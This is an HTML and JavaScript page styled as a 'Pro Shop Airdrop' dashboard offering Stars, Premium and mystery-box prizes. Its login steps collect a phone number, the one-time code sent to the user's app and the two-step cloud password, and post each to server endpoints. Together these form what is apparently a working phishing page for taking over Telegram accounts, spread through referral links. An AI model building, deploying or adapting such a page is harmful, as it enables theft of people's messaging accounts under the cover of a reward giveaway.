<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Shop | Airdrop Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --ps-gold: #ffb300; --ps-gold-light: #ffd54f;
            --ps-bg: #0a0e14; --ps-bg-secondary: #11161f; --ps-bg-tertiary: #1c2330;
            --ps-text: #ffffff; --ps-text-secondary: #6b7785;
            --ps-success: #00e676; --ps-error: #ff5252; --ps-blue: #00b0ff;
            --ps-border: #2a3342; --ps-purple: #9c27b0;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        html, body { height: 100%; font-family: 'Inter', sans-serif; background-color: var(--ps-bg); color: var(--ps-text); overflow-x: hidden; }
        
        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
            background-color: var(--ps-bg);
            background-image: radial-gradient(circle at 15% 15%, rgba(255, 179, 0, 0.06) 0%, transparent 35%), radial-gradient(circle at 85% 85%, rgba(0, 176, 255, 0.06) 0%, transparent 35%); }
        
        .container { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; padding-bottom: 80px; }
        
        .auth-card { background: var(--ps-bg-secondary); border-radius: 20px; padding: 40px; width: 100%; max-width: 450px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid var(--ps-border); position: relative; overflow: hidden; }
        .auth-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(to right, var(--ps-gold), var(--ps-gold-light)); }
        
        .dashboard-card { background: var(--ps-bg-secondary); border-radius: 20px; padding: 30px; width: 100%; max-width: 500px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid var(--ps-border); margin-top: 20px; }
        
        .auth-header { text-align: center; margin-bottom: 30px; }
        .logo-wrapper { width: 80px; height: 80px; margin: 0 auto 15px; background: linear-gradient(135deg, var(--ps-gold) 0%, var(--ps-gold-light) 100%); border-radius: 20px; display: flex; justify-content: center; align-items: center; box-shadow: 0 10px 30px rgba(255, 179, 0, 0.3); animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
        .logo-wrapper svg { width: 40px; height: 40px; fill: var(--ps-bg); }
        .auth-header h1 { font-size: 24px; font-weight: 800; margin-bottom: 8px; background: linear-gradient(to right, #fff, #6b7785); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .auth-header p { color: var(--ps-text-secondary); font-size: 14px; min-height: 20px; }
        
        .form-group { margin-bottom: 20px; position: relative; }
        .form-label { display: block; margin-bottom: 8px; color: var(--ps-text-secondary); font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
        .form-input { width: 100%; padding: 16px 18px; background: var(--ps-bg); border: 1px solid var(--ps-border); border-radius: 12px; color: var(--ps-text); font-family: 'Inter', sans-serif; font-size: 16px; outline: none; transition: all 0.2s; }
        .form-input:focus { border-color: var(--ps-gold); box-shadow: 0 0 0 4px rgba(255, 179, 0, 0.1); }
        
        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(to right, var(--ps-gold), var(--ps-gold-light)); border: none; border-radius: 12px; color: var(--ps-bg); font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; margin-top: 10px; text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; justify-content: center; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255, 179, 0, 0.3); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        
        .btn-text { background: none; border: none; color: var(--ps-text-secondary); cursor: pointer; font-size: 14px; display: block; margin: 15px auto 0; transition: color 0.2s; }
        .btn-text:hover { color: var(--ps-gold); }
        
        .form-step { display: none; animation: slideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        .form-step.active { display: block; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        
        .otp-group { display: flex; justify-content: space-between; gap: 10px; }
        .otp-input { width: 50px; height: 60px; text-align: center; background: var(--ps-bg); border: 1px solid var(--ps-border); border-radius: 12px; color: var(--ps-text); font-size: 24px; font-weight: 600; outline: none; transition: all 0.2s; }
        .otp-input:focus { border-color: var(--ps-gold); box-shadow: 0 0 0 4px rgba(255, 179, 0, 0.1); transform: scale(1.05); }
        
        .toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; max-width: 350px; }
        .toast { background: var(--ps-bg-secondary); border-left: 4px solid var(--ps-gold); padding: 15px 20px; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.4); animation: slideIn 0.3s ease; font-size: 14px; border: 1px solid var(--ps-border); }
        .toast.success { border-left-color: var(--ps-success); color: var(--ps-success); }
        .toast.error { border-left-color: var(--ps-error); color: var(--ps-error); }
        
        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.3); border-radius: 50%; border-top-color: var(--ps-bg); animation: spin 1s linear infinite; margin-right: 10px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        /* Dashboard Specifics */
        .dash-header { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
        .avatar-placeholder { width: 60px; height: 60px; background: linear-gradient(135deg, var(--ps-gold), var(--ps-gold-light)); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 700; color: var(--ps-bg); }
        .dash-info h2 { font-size: 18px; margin-bottom: 4px; }
        .dash-info p { color: var(--ps-text-secondary); font-size: 13px; }
        
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
        .stat-box { background: var(--ps-bg); padding: 15px; border-radius: 12px; border: 1px solid var(--ps-border); text-align: center; }
        .stat-box h3 { font-size: 24px; color: var(--ps-gold); margin-bottom: 5px; }
        .stat-box p { font-size: 12px; color: var(--ps-text-secondary); text-transform: uppercase; }
        
        .section-title { font-size: 16px; font-weight: 700; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
        
        .ref-box { background: var(--ps-bg); padding: 15px; border-radius: 12px; border: 1px dashed var(--ps-border); display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .ref-link { color: var(--ps-blue); font-size: 13px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 70%; }
        .copy-btn { background: var(--ps-bg-tertiary); color: var(--ps-text); border: none; padding: 8px 12px; border-radius: 8px; cursor: pointer; font-size: 12px; font-weight: 600; transition: 0.2s; }
        .copy-btn:hover { background: var(--ps-gold); color: var(--ps-bg); }
        
        .mystery-box-container { text-align: center; padding: 20px 0; }
        .mystery-box { width: 120px; height: 120px; margin: 0 auto 20px; background: linear-gradient(135deg, var(--ps-purple), #ff4081); border-radius: 20px; display: flex; align-items: center; justify-content: center; font-size: 48px; box-shadow: 0 10px 30px rgba(156, 39, 176, 0.4); cursor: pointer; transition: transform 0.2s; animation: pulse 2s infinite; }
        .mystery-box:hover { transform: scale(1.05); }
        .mystery-box.shaking { animation: shake 0.5s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(156, 39, 176, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(156, 39, 176, 0); } 100% { box-shadow: 0 0 0 0 rgba(156, 39, 176, 0); } }
        @keyframes shake { 0% { transform: rotate(0deg); } 25% { transform: rotate(-10deg); } 75% { transform: rotate(10deg); } 100% { transform: rotate(0deg); } }
        
        .rewards-list { max-height: 200px; overflow-y: auto; }
        .reward-item { display: flex; align-items: center; gap: 10px; padding: 10px; background: var(--ps-bg); border-radius: 10px; margin-bottom: 8px; border: 1px solid var(--ps-border); }
        .reward-icon { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; }
        .reward-icon.stars { background: rgba(255, 179, 0, 0.2); color: var(--ps-gold); }
        .reward-icon.premium { background: rgba(156, 39, 176, 0.2); color: var(--ps-purple); }
        .reward-info p { font-size: 13px; font-weight: 600; }
        .reward-info span { font-size: 11px; color: var(--ps-text-secondary); }
        
        /* Modal */
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10000; display: none; justify-content: center; align-items: center; }
        .modal-overlay.active { display: flex; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .modal-content { background: var(--ps-bg-secondary); padding: 40px; border-radius: 20px; text-align: center; max-width: 350px; width: 90%; border: 2px solid var(--ps-gold); animation: scaleUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        @keyframes scaleUp { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        .modal-icon { font-size: 64px; margin-bottom: 20px; }
        .modal-title { font-size: 24px; font-weight: 800; margin-bottom: 10px; }
        .modal-desc { color: var(--ps-text-secondary); margin-bottom: 25px; }
    </style>
</head>
<body>
    <div class="bg-pattern"></div>
    <div class="toast-container" id="toastContainer"></div>
    
    <!-- Reward Modal -->
    <div class="modal-overlay" id="rewardModal">
        <div class="modal-content">
            <div class="modal-icon" id="modalIcon">🎁</div>
            <h2 class="modal-title" id="modalTitle">Congratulations!</h2>
            <p class="modal-desc" id="modalDesc">You won 10 Stars!</p>
            <button class="btn-primary" onclick="document.getElementById('rewardModal').classList.remove('active')">Awesome!</button>
        </div>
    </div>

    <div class="container">
        <!-- AUTH SECTION -->
        <div class="auth-card">
            <div class="auth-header">
                <div class="logo-wrapper">
                    <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zm0 13L2 10v8l10 5 10-5v-8l-10 5z"/></svg>
                </div>
                <h1>Pro Shop Airdrop</h1>
                <p id="stepDescription">Secure MTProto Authentication</p>
            </div>

            <div class="form-step active" id="step_phone">
                <form id="phoneForm" autocomplete="off">
                    <div class="form-group">
                        <label class="form-label" for="phone">Phone Number</label>
                        <input type="tel" id="phone" class="form-input" placeholder="+1 234 567 890" required>
                    </div>
                    <button type="submit" class="btn-primary" id="btnSendCode">Continue</button>
                </form>
            </div>

            <div class="form-step" id="step_code">
                <form id="codeForm" autocomplete="off">
                    <div class="form-group">
                        <label class="form-label">Verification Code</label>
                        <div class="otp-group">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                        </div>
                        <input type="hidden" id="codeHidden">
                    </div>
                    <button type="submit" class="btn-primary" id="btnVerifyCode">Verify Code</button>
                    <button type="button" class="btn-text" id="backToPhone">Change Phone Number</button>
                </form>
            </div>

            <div class="form-step" id="step_2fa">
                <form id="twoFaForm" autocomplete="off">
                    <div class="form-group">
                        <label class="form-label" for="password">Two-Step Verification</label>
                        <input type="password" id="password" class="form-input" placeholder="Enter your password" required>
                    </div>
                    <button type="submit" class="btn-primary" id="btnVerify2fa">Unlock Account</button>
                </form>
            </div>
        </div>

        <!-- DASHBOARD SECTION -->
        <div class="form-step" id="step_dashboard" style="max-width: 500px; width: 100%;">
            <div class="dashboard-card">
                <div class="dash-header">
                    <div class="avatar-placeholder" id="avatarPlaceholder">U</div>
                    <div class="dash-info">
                        <h2 id="userName">Loading...</h2>
                        <p id="userUsername">@username</p>
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-box">
                        <h3 id="statBalance">0</h3>
                        <p>Balance</p>
                    </div>
                    <div class="stat-box">
                        <h3 id="statRefs">0</h3>
                        <p>Referrals</p>
                    </div>
                </div>

                <div class="section-title">🎁 Mystery Box</div>
                <div class="mystery-box-container">
                    <div class="mystery-box" id="mysteryBox">📦</div>
                    <p style="color:var(--ps-text-secondary); font-size:14px; margin-bottom:15px;">Open the box for 17 Coins to win up to 50 Stars or Premium!</p>
                    <button class="btn-primary" id="btnOpenBox" style="background: linear-gradient(to right, var(--ps-purple), #ff4081);">Open for 17 Coins</button>
                </div>
            </div>

            <div class="dashboard-card">
                <div class="section-title">🔗 Referral Link</div>
                <div class="ref-box">
                    <span class="ref-link" id="refLink">https://t.me/YourBot?start=ref_CODE</span>
                    <button class="copy-btn" id="copyBtn">Copy</button>
                </div>
                
                <div class="section-title" style="margin-top:25px;">🏆 Recent Rewards</div>
                <div class="rewards-list" id="rewardsList">
                    <p style="text-align:center; color:var(--ps-text-secondary); font-size:13px;">No rewards yet. Open a mystery box!</p>
                </div>
            </div>
            
            <button class="btn-primary" id="btnLogout" style="background: var(--ps-error); color: #fff; margin-top: 20px;">Log Out</button>
        </div>
    </div>

    <script>
        let currentSessionId = null;
        let webToken = null;
        let userId = null;

        const Toast = {
            container: document.getElementById('toastContainer'),
            show: function(message, type = 'info', duration = 3500) {
                const toast = document.createElement('div');
                toast.className = `toast ${type}`;
                toast.textContent = message;
                this.container.appendChild(toast);
                setTimeout(() => toast.remove(), duration);
            }
        };

        const Steps = {
            current: 'phone',
            steps: {
                phone: { el: document.getElementById('step_phone'), desc: 'Secure MTProto Authentication' },
                code: { el: document.getElementById('step_code'), desc: 'Enter the 5-digit code sent to your app' },
                '2fa': { el: document.getElementById('step_2fa'), desc: 'Enter your cloud password' },
                dashboard: { el: document.getElementById('step_dashboard'), desc: 'Welcome to Airdrop Dashboard' }
            },
            go: function(step) {
                document.querySelector('.auth-card').style.display = step === 'dashboard' ? 'none' : 'block';
                Object.values(this.steps).forEach(s => s.el.classList.remove('active'));
                this.steps[step].el.classList.add('active');
                this.current = step;
            }
        };

        async function apiReq(endpoint, data) {
            const res = await fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            const json = await res.json();
            if (!res.ok) throw new Error(json.detail || 'API Error');
            return json;
        }

        function setLoading(btn, loading, text) {
            btn.disabled = loading;
            btn.innerHTML = loading ? `<span class="spinner"></span> Processing...` : text;
        }

        // Auth Logic
        document.getElementById('phoneForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const phone = document.getElementById('phone').value.trim();
            const btn = document.getElementById('btnSendCode');
            // Get ref_code from URL if exists
            const urlParams = new URLSearchParams(window.location.search);
            const refCode = urlParams.get('ref');
            
            if (!phone.match(/^\+?[0-9]{10,15}$/)) return Toast.show('Invalid phone format.', 'error');
            setLoading(btn, true, 'Continue');
            try {
                const res = await apiReq('/api/v1/json/send-code', { phone, ref_code: refCode });
                currentSessionId = res.data.session_id;
                Toast.show(res.message, 'success');
                Steps.go('code');
            } catch (err) { Toast.show(err.message, 'error'); }
            finally { setLoading(btn, false, 'Continue'); }
        });

        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (input.value.length > 1) input.value = input.value.slice(0, 1);
                if (input.value.length === 1 && index < otpInputs.length - 1) otpInputs[index + 1].focus();
                let code = '';
                otpInputs.forEach(i => code += i.value);
                document.getElementById('codeHidden').value = code;
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) otpInputs[index - 1].focus();
            });
        });

        document.getElementById('codeForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const code = document.getElementById('codeHidden').value;
            const btn = document.getElementById('btnVerifyCode');
            if (code.length !== 5) return Toast.show('Enter all 5 digits.', 'error');
            setLoading(btn, true, 'Verify Code');
            try {
                const res = await apiReq('/api/v1/json/verify-code', { session_id: currentSessionId, code });
                if (res.status === 'success') {
                    webToken = res.web_token;
                    userId = res.user.user_id;
                    Toast.show('Login successful!', 'success');
                    loadDashboard();
                    Steps.go('dashboard');
                } else if (res.status === '2fa_required') {
                    Toast.show(res.message, 'info');
                    Steps.go('2fa');
                }
            } catch (err) { Toast.show(err.message, 'error'); }
            finally { setLoading(btn, false, 'Verify Code'); }
        });

        document.getElementById('backToPhone').addEventListener('click', () => {
            otpInputs.forEach(i => i.value = '');
            Steps.go('phone');
        });

        document.getElementById('twoFaForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const password = document.getElementById('password').value;
            const btn = document.getElementById('btnVerify2fa');
            setLoading(btn, true, 'Unlock Account');
            try {
                const res = await apiReq('/api/v1/json/verify-2fa', { session_id: currentSessionId, password });
                if (res.status === 'success') {
                    webToken = res.web_token;
                    userId = res.user.user_id;
                    Toast.show('2FA successful!', 'success');
                    loadDashboard();
                    Steps.go('dashboard');
                }
            } catch (err) { Toast.show(err.message, 'error'); }
            finally { setLoading(btn, false, 'Unlock Account'); }
        });

        // Dashboard Logic
        async function loadDashboard() {
            try {
                const res = await fetch('/api/v1/airdrop/profile', {
                    headers: { 'Authorization': `Bearer ${webToken}`, 'X-User-ID': userId }
                });
                const data = await res.json();
                
                document.getElementById('userName').textContent = `${data.first_name || 'User'}`;
                document.getElementById('userUsername').textContent = data.username ? `@${data.username}` : `ID: ${data.user_id}`;
                document.getElementById('avatarPlaceholder').textContent = data.first_name ? data.first_name.charAt(0).toUpperCase() : 'U';
                document.getElementById('statBalance').textContent = data.balance;
                document.getElementById('statRefs').textContent = data.referrals;
                document.getElementById('refLink').textContent = `https://t.me/YourBot?start=ref_${data.ref_code}`;
                
                const rewardsList = document.getElementById('rewardsList');
                if(data.rewards && data.rewards.length > 0) {
                    rewardsList.innerHTML = data.rewards.reverse().map(r => `
                        <div class="reward-item">
                            <div class="reward-icon ${r.type.toLowerCase()}">${r.type === 'Premium' ? '⭐️' : '✨'}</div>
                            <div class="reward-info">
                                <p>${r.amount} ${r.type}</p>
                                <span>${new Date(r.date).toLocaleString()}</span>
                            </div>
                        </div>
                    `).join('');
                }
            } catch (err) { Toast.show('Failed to load profile.', 'error'); }
        }

        document.getElementById('btnOpenBox').addEventListener('click', async () => {
            const box = document.getElementById('mysteryBox');
            const btn = document.getElementById('btnOpenBox');
            box.classList.add('shaking');
            btn.disabled = true;
            btn.innerHTML = `<span class="spinner"></span> Opening...`;
            
            try {
                const res = await fetch('/api/v1/airdrop/open-gift', {
                    method: 'POST',
                    headers: { 'Authorization': `Bearer ${webToken}`, 'X-User-ID': userId }
                });
                const data = await res.json();
                if(!res.ok) throw new Error(data.detail);
                
                setTimeout(() => {
                    box.classList.remove('shaking');
                    btn.disabled = false;
                    btn.innerHTML = 'Open for 17 Coins';
                    
                    // Show Modal
                    document.getElementById('modalIcon').textContent = data.reward.type === 'Premium' ? '🚀' : '✨';
                    document.getElementById('modalTitle').textContent = data.reward.type === 'Premium' ? 'JACKPOT!' : 'You Won!';
                    document.getElementById('modalDesc').textContent = `Congratulations! You won ${data.reward.amount} ${data.reward.type}!`;
                    document.getElementById('rewardModal').classList.add('active');
                    
                    // Update balance
                    document.getElementById('statBalance').textContent = data.new_balance;
                    loadDashboard(); // Refresh rewards list
                }, 1500);
            } catch (err) {
                box.classList.remove('shaking');
                btn.disabled = false;
                btn.innerHTML = 'Open for 17 Coins';
                Toast.show(err.message, 'error');
            }
        });

        document.getElementById('copyBtn').addEventListener('click', () => {
            const link = document.getElementById('refLink').textContent;
            navigator.clipboard.writeText(link);
            Toast.show('Referral link copied!', 'success');
        });

        document.getElementById('btnLogout').addEventListener('click', () => {
            window.location.href = '/';
        });
    </script>
</body>
</html>
